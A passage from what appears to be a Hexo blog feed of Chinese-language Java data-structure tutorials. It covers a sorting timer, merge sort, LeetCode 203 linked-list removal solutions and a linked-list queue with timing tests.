<h2 id="SortingHelper-java（辅助进行算法时间输出的）"><a href="#SortingHelper-java（辅助进行算法时间输出的）" class="headerlink" title="SortingHelper.java（辅助进行算法时间输出的）"></a>SortingHelper.java（辅助进行算法时间输出的）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class SortingHelper &#123;</span><br><span class="line"></span><br><span class="line">    private SortingHelper()&#123;&#125; &#x2F;&#x2F;私有类</span><br><span class="line"></span><br><span class="line">    public static &lt;E extends Comparable&lt;E&gt;&gt; boolean isSorted(E[] arr)&#123;</span><br><span class="line"></span><br><span class="line">        for(int i &#x3D; 1; i&lt; arr.length; i++)</span><br><span class="line">            if (arr[i - 1].compareTo(arr[i]) &gt; 0)</span><br><span class="line">            return false;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static &lt;E extends Comparable&lt;E&gt;&gt; void sortTest(String sortname, E[] arr)&#123;</span><br><span class="line">        long startTime &#x3D; System.nanoTime();</span><br><span class="line">        if(sortname.equals(&quot;SelectionSort&quot;)) &#123;</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        &#125; else if(sortname.equals(&quot;InsertionSort&quot;))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        else if(sortname.equals(&quot;InsertionSort2&quot;))</span><br><span class="line">            InsertionSort.sort2(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort&quot;))</span><br><span class="line">            MergeSort.sort(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort2&quot;))</span><br><span class="line">            MergeSort.sort2(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort3&quot;))</span><br><span class="line">            MergeSort.sort3(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSort4&quot;))</span><br><span class="line">            MergeSort.sort4(arr);</span><br><span class="line">        else if(sortname.equals(&quot;MergeSortBU&quot;))</span><br><span class="line">            MergeSort.sortBU(arr);</span><br><span class="line">        else if(sortname.equals(&quot;QuickSort&quot;))</span><br><span class="line">            QuickSort.sort(arr);</span><br><span class="line">        else if(sortname.equals(&quot;QuickSort2&quot;))</span><br><span class="line">            QuickSort.sort2ways(arr);</span><br><span class="line">        else if(sortname.equals(&quot;QuickSort3&quot;))</span><br><span class="line">            QuickSort.sort3ways(arr);</span><br><span class="line">        long endTime &#x3D; System.nanoTime();</span><br><span class="line"></span><br><span class="line">        double time &#x3D; (endTime - startTime) &#x2F; 1000000000.0; &#x2F;&#x2F;纳米要&#x2F;9个零</span><br><span class="line"></span><br><span class="line">        if(!SortingHelper.isSorted(arr))</span><br><span class="line">            throw new RuntimeException(sortname + &quot;failed&quot;);</span><br><span class="line">        System.out.println(String.format(&quot;%s , n &#x3D; %d : %f s &quot;, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>快速排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-归并排序（完整代码）</title>
    <url>/2021/06/27/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%EF%BC%88%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="归并排序执行结果截图"><a href="#归并排序执行结果截图" class="headerlink" title="归并排序执行结果截图"></a>归并排序执行结果截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210627222351301.png" alt="image-20210627222351301"></p>
<h1 id="归并排序执行（完整代码）"><a href="#归并排序执行（完整代码）" class="headerlink" title="归并排序执行（完整代码）"></a>归并排序执行（完整代码）</h1><h2 id="MergeSort-java"><a href="#MergeSort-java" class="headerlink" title="MergeSort.java"></a>MergeSort.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MergeSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">MergeSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line">        sort(arr, <span class="number">0</span> , arr.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt;<span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> mid  = (l  +  r ) / <span class="number">2</span>;</span><br><span class="line">        sort(arr, l, mid);</span><br><span class="line">        sort(arr, mid+<span class="number">1</span>, r);</span><br><span class="line">        merge(arr, l , mid , r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并两个有序的区间 arr[l...mid] 和 arr[mid + 1, r]</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(E[] arr, <span class="keyword">int</span> l , <span class="keyword">int</span> mid, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E[] temp = Arrays.copyOfRange(arr, l , r + <span class="number">1</span>); <span class="comment">//前闭后开，所以要r+1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = l, j = mid + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//每轮循环为arr[k]赋值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = l ; k &lt;= r ; k ++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i &gt; mid) &#123;</span><br><span class="line">                arr[k] = temp[j - l]; j ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(j &gt; r)&#123;</span><br><span class="line">                arr[k] = temp[i - l]; i ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(temp[i - l].compareTo(temp[j - l]) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                arr[k] = temp[i - l]; i ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                arr[k] = temp[j - l]; j ++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// arr[i] 和 arr[j]</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">100000</span>;</span><br><span class="line">        Integer[] arr = ArrayGenerator.generateRandomArray(n, n);</span><br><span class="line">        MergeSort.sort(arr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i++)&#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java-生成随机n个元素的数组"><a href="#ArrayGenerator-java-生成随机n个元素的数组" class="headerlink" title="ArrayGenerator.java(生成随机n个元素的数组)"></a>ArrayGenerator.java(生成随机n个元素的数组)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>归并排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】LeetCode题答-203移除链表元素</title>
    <url>/2021/06/26/%E3%80%90Java%E3%80%91LeetCode%E9%A2%98%E7%AD%94-203%E7%A7%BB%E9%99%A4%E9%93%BE%E8%A1%A8%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LeetCood题目"><a href="#LeetCood题目" class="headerlink" title="LeetCood题目"></a>LeetCood题目</h1><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626190731545.png" alt="image-20210626190731545"></h2><h1 id="题答1（完整代码）"><a href="#题答1（完整代码）" class="headerlink" title="题答1（完整代码）"></a>题答1（完整代码）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head != <span class="keyword">null</span> &amp;&amp; head.val == val)&#123;</span><br><span class="line">            ListNode delNode = head;</span><br><span class="line">            head = head.next;</span><br><span class="line">            delNode.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        ListNode prev = head;</span><br><span class="line">        <span class="keyword">while</span>(prev.next != <span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.next.val == val) &#123;</span><br><span class="line">                ListNode delNode = prev.next;</span><br><span class="line">                prev.next = delNode.next;</span><br><span class="line">                delNode.next = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="题答2（利用虚拟头）"><a href="#题答2（利用虚拟头）" class="headerlink" title="题答2（利用虚拟头）"></a>题答2（利用虚拟头）</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ListNode dummyHead = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">        dummyHead.next = head;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        ListNode prev = dummyHead;</span><br><span class="line">        <span class="keyword">while</span>(prev.next != <span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(prev.next.val == val) &#123;</span><br><span class="line">                ListNode delNode = prev.next;</span><br><span class="line">                prev.next = delNode.next;</span><br><span class="line">                delNode.next = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="题解3（利用链表递归）和原理图"><a href="#题解3（利用链表递归）和原理图" class="headerlink" title="题解3（利用链表递归）和原理图"></a>题解3（利用链表递归）和原理图</h2><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210627024604937.png" alt="image-20210627024604937"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeElements</span><span class="params">(ListNode head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>) <span class="comment">//最小规模情况结束条件</span></span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        head.next = removeElements(head.next, val);</span><br><span class="line">        <span class="keyword">return</span> head.val == val ? head.next : head; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="本地测试截图"><a href="#本地测试截图" class="headerlink" title="本地测试截图"></a>本地测试截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626190930982.png" alt="image-20210626190930982"></p>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-链表实现队列(完整代码)</title>
    <url>/2021/06/26/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97(%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81)/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="链表实现队列的接口"><a href="#链表实现队列的接口" class="headerlink" title="链表实现队列的接口"></a>链表实现队列的接口</h1><h2 id="Queue-java"><a href="#Queue-java" class="headerlink" title="Queue.java"></a>Queue.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">dequeue</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">E <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="链表实现队列操作执行结果"><a href="#链表实现队列操作执行结果" class="headerlink" title="链表实现队列操作执行结果"></a>链表实现队列操作执行结果</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626170535468.png" alt="image-20210626170535468"></p>
<h1 id="链表实现队列操作（完整代码）"><a href="#链表实现队列操作（完整代码）" class="headerlink" title="链表实现队列操作（完整代码）"></a>链表实现队列操作（完整代码）</h1><h2 id="LinkedListQueue-java（实现队列的操作）"><a href="#LinkedListQueue-java（实现队列的操作）" class="headerlink" title="LinkedListQueue.java（实现队列的操作）"></a>LinkedListQueue.java（实现队列的操作）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedListQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span> </span>&#123; <span class="keyword">this</span>(e, <span class="keyword">null</span>);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span> </span>&#123;<span class="keyword">this</span>(<span class="keyword">null</span>, <span class="keyword">null</span>);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> e.toString(); &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node head, tail;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedListQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        head = <span class="keyword">null</span>;</span><br><span class="line">        tail = <span class="keyword">null</span>;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//入队</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tail == <span class="keyword">null</span>)&#123;</span><br><span class="line">            tail = <span class="keyword">new</span> Node(e);</span><br><span class="line">            head = tail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail.next = <span class="keyword">new</span> Node(e);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//出队</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot dequeue from an empty queue."</span>);</span><br><span class="line"></span><br><span class="line">        Node retNode = head;</span><br><span class="line">        head = head.next;</span><br><span class="line">        retNode.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)</span><br><span class="line">            tail = <span class="keyword">null</span>;</span><br><span class="line">        size --;</span><br><span class="line">        <span class="keyword">return</span> retNode.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Queue is empty"</span>);</span><br><span class="line">        <span class="keyword">return</span> head.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(<span class="string">"Queue: front "</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            res.append((cur + <span class="string">"-&gt;"</span>));</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">"NULL tail"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        LinkedListQueue&lt;Integer&gt; queue = <span class="keyword">new</span> LinkedListQueue&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i ++)&#123;</span><br><span class="line">            queue.enqueue(i);</span><br><span class="line">            System.out.println(queue);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">2</span>)&#123;</span><br><span class="line">                queue.dequeue();</span><br><span class="line">                System.out.println(queue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图"><a href="#我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图" class="headerlink" title="我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图"></a>我对比了一下数组队列、循环数组队列、链表实现队列的时间输出结果截图</h1><blockquote>
<ul>
<li><h2 id="明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右"><a href="#明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右" class="headerlink" title="明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右"></a>明显循环数组队列和列表实现队列的时间相当，数组队列最差。相差100倍左右</h2></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210626170306274.png" alt="image-20210626170306274"></p>
<h1 id="测试时间代码"><a href="#测试时间代码" class="headerlink" title="测试时间代码"></a>测试时间代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试使用q运行opCount个enqueue和dequeue操作所需要的时间，单位：秒</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">testQueue</span><span class="params">(Queue&lt;Integer&gt; q, <span class="keyword">int</span> opCount)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount; i ++)</span><br><span class="line">            q.enqueue(random.nextInt(Integer.MAX_VALUE));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount ; i ++)</span><br><span class="line">            q.dequeue();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (endTime - startTime) / <span class="number">100000000.0</span>;</span><br><span 